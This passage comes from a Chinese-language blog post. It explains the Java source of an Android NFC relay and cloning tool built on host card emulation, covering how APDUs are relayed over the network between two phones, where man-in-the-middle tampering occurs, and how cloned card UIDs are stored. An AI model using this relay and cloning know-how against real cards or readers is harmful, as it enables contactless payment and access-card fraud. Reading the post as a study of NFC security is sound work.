这个函数会将config数据(也就是Hce手机端接受的第一条来自card的数据)根据特定的数据类型转换为可读的有意义的数据.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] config)</span> </span>&#123;</span><br><span class="line">    mOptions.clear();</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(index + <span class="number">2</span> &lt; config.length) &#123;</span><br><span class="line">        <span class="keyword">byte</span> type = config[index + <span class="number">0</span>];</span><br><span class="line">        <span class="keyword">byte</span> length = config[index + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        System.arraycopy(config, index + <span class="number">2</span>, data, <span class="number">0</span>, length);</span><br><span class="line"></span><br><span class="line">        add(OptionType.fromType(type), data);</span><br><span class="line">        index += length + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数是上一个函数的逆函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] build() &#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ConfigOption option : mOptions)</span><br><span class="line">        length += option.len() + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ConfigOption option : mOptions) &#123;</span><br><span class="line">        option.push(data, offset);</span><br><span class="line">        offset += option.len() + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这个函数讲格式化之后的字符串拼接起来, 返回给调用者</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ConfigOption option : mOptions)</span><br><span class="line">        result.append(option.toString());</span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>ConfigOption</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数被上示代码中的toString函数调用</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">true<span class="comment">// 这里根据特定的数据, 给定特定的名称.</span></span><br><span class="line">    result.append(<span class="string">"Type: "</span>);</span><br><span class="line">    result.append(mID.toString());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mData.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        result.append(<span class="string">" ("</span>);</span><br><span class="line">        result.append(mData.length);</span><br><span class="line">        result.append(<span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result.append(<span class="string">", Value: 0x"</span>);</span><br><span class="line">    result.append(bytesToHex(mData));</span><br><span class="line">    result.append(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>OptionType</strong></p><p>这是一个枚举类, 为上示<code>parse</code>函数提供解析.</p></li></ol><h3 id="hce">Ⅱ. hce</h3><ol type="1"><li><p><strong>ApduService</strong></p><p>这个类是与底层lib交互apdu命令最终要的一个类, 其中重要的函数有<code>processCommandApdu</code>、<code>onDeactivated</code>、<code>sendResponse</code>等:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] processCommandApdu(<span class="keyword">byte</span>[] apdu, Bundle extras) &#123;</span><br><span class="line">    Log.d(TAG, <span class="string">"APDU-IN: "</span> + Utils.bytesToHex(apdu));</span><br><span class="line">    <span class="comment">// 这里需要留意的是, 只有当滑动到HCE界面的时候(即mCurrent==3), 才让其返回handleApdu的值</span></span><br><span class="line">    <span class="keyword">if</span> (SlidingTabLayout.mCurrentPos == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> handleApdu(getApplicationContext(), apdu);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Package the ADPU into a NfcComm object</span></span><br><span class="line">    NfcComm nfcdata = <span class="keyword">new</span> NfcComm(NfcComm.Source.HCE, apdu);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send the object to the handler</span></span><br><span class="line">    mNfcManager.handleHCEData(nfcdata);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tell the HCE implementation to wait a moment</span></span><br><span class="line">    <span class="keyword">return</span> DONT_RESPOND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数传入的<code>byte[] apdu</code>就是来自卡的apdu命令, 而return的<code>byte[]</code>就是手机返回给卡的数据.</p><p>期间, 对输入进来的数据进行实例化之后, 通过<code>handleHCEData</code>函数处理.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数当读卡器断开交易的时候被调用</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDeactivated</span><span class="params">(<span class="keyword">int</span> reason)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (SlidingTabLayout.mCurrentPos == <span class="number">3</span>) &#123;</span><br><span class="line">        Utils.tv.append(<span class="string">"-------------------------------------End-------------------------------------\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mNfcManager.unsetApduService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// sendResponseApdu函数是返回给卡的一个函数, 其功能相当于processCommandApdu的返回值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendResponse</span><span class="params">(<span class="keyword">byte</span>[] apdu)</span> </span>&#123;</span><br><span class="line">    Log.d(TAG, <span class="string">"APDU-OUT: "</span> + Utils.bytesToHex(apdu));</span><br><span class="line">    sendResponseApdu(apdu);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这个函数用在hce功能的时候, 其中处理逻辑都在Utils类中.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">byte</span>[] handleApdu(Context context, <span class="keyword">byte</span>[] apdu) &#123;</span><br><span class="line">    Utils.tv.append(<span class="string">"pos:\n"</span>+Utils.bytesToHex(apdu)+<span class="string">"\n\n"</span>);</span><br><span class="line">    String payload =  Utils.Start(context,apdu);</span><br><span class="line">    Log.i(TAG,<span class="string">"payload: "</span> + payload);</span><br><span class="line">    Utils.tv.append(<span class="string">"card:\n"</span>+payload+<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> Utils.toBytes(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>DaemonConfiguration</strong></p><p>这个类在<code>MainActivity</code>被调用, 这里会根据<code>Action</code>发送<code>Broadcast</code>.</p></li></ol><h3 id="reader">Ⅲ. reader</h3><p>这里根据卡的类型选择特定的类返回相应的命令, 各种卡标签的识别是建立在继承<code>NFCTagReader</code>这个接口上的.</p><h3 id="nfcmanager">Ⅳ. NfcManager</h3><p>这是格式化apdu数据最重要的一个类, 定义了apdu的各种属性.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> NfcComm <span class="title">handleHceDataCommon</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    Log.d(TAG, <span class="string">"handleHceDataCommon: Pre-Filter: "</span> +</span><br><span class="line">          Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">    <span class="keyword">if</span> (mFilterManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        nfcdata = mFilterManager.filterHCEData(nfcdata);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    notifySinkManager(nfcdata);</span><br><span class="line"></span><br><span class="line">    Log.d(TAG, <span class="string">"handleHceDataCommon: Post-Filter: "</span> +</span><br><span class="line">          Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> NfcComm <span class="title">handleCardDataCommon</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    Log.d(TAG, <span class="string">"handleCardDataCommon: Pre-Filter: "</span> +</span><br><span class="line">          Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">    <span class="keyword">if</span> (mFilterManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        nfcdata = mFilterManager.filterCardData(nfcdata);</span><br><span class="line">    &#125;</span><br><span class="line">    notifySinkManager(nfcdata);</span><br><span class="line"></span><br><span class="line">    Log.d(TAG, <span class="string">"handleCardDataCommon: Post-Filter: "</span> +</span><br><span class="line">          Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面两个函数, 分辨是handle <code>card</code> <code>reader</code> 的函数, 其中最为重要的是<code>filterCardData</code> <code>filterHCEData</code>两个函数, 其中中间人数据就是在<code>filterCardData</code> <code>filterHCEData</code>两个方法里被篡改的. 函数的实现在后面<code>RuleMatching.java</code>会介绍.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">true<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Send NFC data to the card</span></span><br><span class="line"><span class="comment">     * 这里主要将HCE手机的来自读卡器的apdu通过network发给另一部手机.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nfcdata NFcComm object containing the message for the card</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendToCard</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mReader.isConnected()) &#123;</span><br><span class="line">        nfcdata = handleHceDataCommon(nfcdata);</span><br><span class="line">        Log.i(TAG,<span class="string">"sendToCard: "</span> + Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">        <span class="comment">// Communicate with card</span></span><br><span class="line">        <span class="keyword">byte</span>[] reply = mReader.sendCmd(nfcdata.getData());</span><br><span class="line">        <span class="keyword">if</span> (reply == <span class="keyword">null</span>) &#123;</span><br><span class="line">            mReader.closeConnection();</span><br><span class="line">            mNetworkHandler.disconnectCardWorkaround();</span><br><span class="line">            mNetworkHandler.notifyNFCNotConnected();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Create NfcComm object and pass it through filter and sinks</span></span><br><span class="line">            NfcComm nfcreply = <span class="keyword">new</span> NfcComm(NfcComm.Source.CARD, reply);</span><br><span class="line">            nfcreply = handleCardDataCommon(nfcreply);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Send message</span></span><br><span class="line">            mNetworkHandler.sendAPDUReply(nfcreply);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"HandleNFCData: No NFC connection active"</span>);</span><br><span class="line">        <span class="comment">// There is no connected NFC device</span></span><br><span class="line">        mNetworkHandler.notifyNFCNotConnected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Send NFC data to the Reader</span></span><br><span class="line"><span class="comment">     * 这里主要将普通手机读取的来自卡的apdu发给HCE进而发给读卡器.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nfcdata NfcComm object containing the message for the Reader</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendToReader</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mApduService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Pass data through sinks and filters</span></span><br><span class="line">        nfcdata = handleCardDataCommon(nfcdata);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Send data to the Reader device</span></span><br><span class="line">        Log.i(TAG,<span class="string">"sendToReader: "</span> + Utils.bytesToHex(nfcdata.getData()));</span><br><span class="line">        mApduService.sendResponse(nfcdata.getData());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">"HandleNFCData: Received a message for a reader, but no APDU instance active."</span>);</span><br><span class="line">        mNetworkHandler.notifyNFCNotConnected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x04-util">0x04 util</h2><h3 id="db">Ⅰ. db</h3><h4 id="cloneliststorage">1. CloneListStorage</h4><p><code>CloneListItem</code>是定义数据库每个<code>Item</code>数据结构的一个类, 其实现并不复杂, 不再赘述. 接下来看<code>CloneListStorage</code>:</p><ol type="1"><li><p>首先定义数据库名称及各列的列名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All Static variables</span></span><br><span class="line"><span class="comment">// Database Version</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DATABASE_VERSION = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Database Name</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DATABASE_NAME = <span class="string">"clonemode.db"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// table name</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TABLE_NAME = <span class="string">"list"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Table Columns names</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_ID = <span class="string">"id"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_NAME = <span class="string">"name"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_CONFIG = <span class="string">"config"</span>;</span><br></pre></td></tr></table></figure></li><li><p>然后建立数据库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果要调用或者建立这个数据库, 传入一个context即可新建/获得这个数据库.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CloneListStorage</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, DATABASE_NAME, <span class="keyword">null</span>, DATABASE_VERSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里重写了onCreate方法, 是产生相应的table. 注意下列字符串定义了每个table的数据类型 </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</span><br><span class="line">    String CREATE_CONTACTS_TABLE = <span class="string">"CREATE TABLE "</span> + TABLE_NAME + <span class="string">"("</span></span><br><span class="line">        + KEY_ID + <span class="string">" INTEGER PRIMARY KEY,"</span></span><br><span class="line">        + KEY_NAME + <span class="string">" TEXT,"</span></span><br><span class="line">        + KEY_CONFIG + <span class="string">" BLOB"</span></span><br><span class="line">        + <span class="string">")"</span>;</span><br><span class="line">    db.execSQL(CREATE_CONTACTS_TABLE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果要往database添加item, 如下函数可实现:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(CloneListItem item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化一个可写的SQLiteDatabase</span></span><br><span class="line">    SQLiteDatabase db = <span class="keyword">this</span>.getWritableDatabase();</span><br><span class="line">    <span class="comment">// 实例化一个ContentValues, 以给对应的table赋值</span></span><br><span class="line">    ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">    <span class="comment">// 首先给KEY_NAME赋值, 也就是item的名称</span></span><br><span class="line">    values.put(KEY_NAME, item.toString());</span><br><span class="line">    <span class="comment">// 获得anticol的值之后, 再build成blob类型</span></span><br><span class="line">    NfcComm ac = item.getAnticolData();</span><br><span class="line">    values.put(KEY_CONFIG, ac.getConfig().build());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Inserting Row 插入数据库中</span></span><br><span class="line">    db.insert(TABLE_NAME, <span class="keyword">null</span>, values);</span><br><span class="line">    db.close(); <span class="comment">// Closing database connection</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在<code>CLONE</code>界面里的自定义UID就是在这里实现的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当数据库里的Defult没有时, 则会调用这个函数生成一个默认的item, 以后产生随机UID或者自定义UID都是在这个item里作修改.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addDefultConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SQLiteDatabase db = <span class="keyword">this</span>.getWritableDatabase();</span><br><span class="line">    <span class="comment">// 这里用的是rawQueray, 可以直接用命令选择相应的list</span></span><br><span class="line">    Cursor c = db.rawQuery(<span class="string">"select * from list"</span>,<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (c.getCount() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        String defultAnticol = <span class="string">"330477AD15D532012830010831010059024744"</span>;</span><br><span class="line">        Log.i(<span class="string">"***DefultAnticol: "</span>, defultAnticol);</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(KEY_NAME, <span class="string">"Defult"</span>);</span><br><span class="line">        values.put(KEY_ID, <span class="number">1</span>);</span><br><span class="line">        values.put(KEY_CONFIG, Utils.toBytes(defultAnticol));</span><br><span class="line">        db.insert(TABLE_NAME, <span class="keyword">null</span>, values);</span><br><span class="line">    &#125;</span><br><span class="line">    db.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeUID</span><span class="params">(String UID)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Utils.isHex(UID)) &#123;</span><br><span class="line">        SQLiteDatabase db = <span class="keyword">this</span>.getWritableDatabase();</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(KEY_CONFIG,</span><br><span class="line">                  Utils.toBytes(</span><br><span class="line">                      <span class="string">"3304"</span>+UID+<span class="string">"32012830010831010059024744"</span>));</span><br><span class="line">        <span class="comment">// Default item总是在数据库的第一个.</span></span><br><span class="line">        db.update(</span><br><span class="line">            TABLE_NAME,</span><br><span class="line">            values,</span><br><span class="line">            KEY_ID + <span class="string">" = ?"</span>,</span><br><span class="line">            <span class="keyword">new</span> String[]&#123;<span class="string">"1"</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        db.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>删除item操作如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以看出, 是根据id(数据库的第几项)来删除item的</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    SQLiteDatabase db = <span class="keyword">this</span>.getWritableDatabase();</span><br><span class="line">    db.delete(TABLE_NAME, KEY_ID + <span class="string">" = ?"</span>,</span><br><span class="line">              <span class="keyword">new</span> String[]&#123;String.valueOf(id)&#125;);</span><br><span class="line">    db.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获得数据库所有的item:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;CloneListItem&gt; <span class="title">getAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;CloneListItem&gt; contactList = <span class="keyword">new</span> ArrayList&lt;CloneListItem&gt;();</span><br><span class="line">    <span class="comment">// Select All Query</span></span><br><span class="line">    String selectQuery = <span class="string">"SELECT  * FROM "</span> + TABLE_NAME;</span><br><span class="line"></span><br><span class="line">    SQLiteDatabase db = <span class="keyword">this</span>.getWritableDatabase();</span><br><span class="line">    Cursor cursor = db.rawQuery(selectQuery, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// looping through all rows and adding to list</span></span><br><span class="line">    <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            contactList.add(createByCursor(cursor));</span><br><span class="line">        &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return contact list</span></span><br><span class="line">    <span class="keyword">return</span> contactList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="ruleliststorage">2. RuleListStorage</h4><p>这里其实跟<code>CloneListStorage</code>很相似, 将一个比较不一样的例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数遍历整个数据库, 然后获取每个item的state值, 可能为0,1,2, 分别表示: 未选中, 修改卡返回的apdu数据, 修改读卡器的apdu数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;Integer, Integer&gt; <span class="title">getStateMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    SQLiteDatabase db = <span class="keyword">this</span>.getReadableDatabase();</span><br><span class="line">    String selectQuery = <span class="string">"SELECT * FROM "</span> + TABLE_NAME;</span><br><span class="line">    Cursor c = db.rawQuery(selectQuery,<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (c.moveToFirst()) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            map.put(c.getInt(c.getColumnIndex(KEY_ID)),</span><br><span class="line">                    c.getInt(c.getColumnIndex(KEY_SELECT_STATE)));</span><br><span class="line">        &#125;<span 